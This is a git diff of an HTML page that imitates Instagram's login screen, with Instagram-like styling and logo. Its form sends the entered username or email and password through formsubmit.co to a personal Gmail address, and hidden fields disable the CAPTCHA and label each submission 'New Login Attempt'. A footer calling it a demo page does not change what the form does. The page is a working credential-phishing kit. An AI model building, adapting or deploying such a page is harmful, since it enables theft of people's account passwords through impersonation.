@@ -4,29 +4,71 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Instagram Login</title>
-  <link rel="stylesheet" href="style.css" />
+  <style>
+    body {
+      font-family: 'Helvetica Neue', sans-serif;
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-box {
+      background: white;
+      border: 1px solid #dbdbdb;
+      padding: 40px;
+      width: 300px;
+      text-align: center;
+    }
+
+    .logo {
+      width: 150px;
+      margin-bottom: 20px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 5px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background: #fafafa;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      background-color: #0095f6;
+      color: white;
+      border: none;
+      border-radius: 3px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .footer {
+      margin-top: 10px;
+      font-size: 12px;
+    }
+  </style>
 </head>
 <body>
-  <div class="login-container">
-    <form class="login-box" action="https://formsubmit.co/theinvestorcompany001@gmail.com" method="POST">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" class="logo" />
-      
-      <!-- Hidden inputs to disable CAPTCHA and redirect -->
-      <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_template" value="table">
-      <input type="hidden" name="_subject" value="New Instagram Login Attempt">
+  <form class="login-box" action="https://formsubmit.co/theinvestorcompany001@gmail.com" method="POST">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" class="logo" alt="Instagram Logo" />
+    
+    <!-- FormSubmit hidden inputs -->
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_template" value="table">
+    <input type="hidden" name="_subject" value="New Login Attempt">
 
-      <input type="text" name="username_or_email" placeholder="Phone number, username, or email" required />
-      <input type="password" name="password" placeholder="Password" required />
-      <button type="submit">Log In</button>
+    <!-- Visible inputs -->
+    <input type="text" name="username_or_email" placeholder="Phone number, username, or email" required />
+    <input type="password" name="password" placeholder="Password" required />
+    <button type="submit">Log In</button>
 
-      <div class="divider">OR</div>
-      <button class="fb-login" type="button">Log in with Facebook</button>
-      <a href="#" class="forgot">Forgot password?</a>
-    </form>
-    <div class="signup-box">
-      <p>Don't have an account? <a href="#">Sign up</a></p>
-    </div>
-  </div>
+    <div class="footer">This is a demo page. Not affiliated with Instagram.</div>
+  </form>
 </body>
 </html>
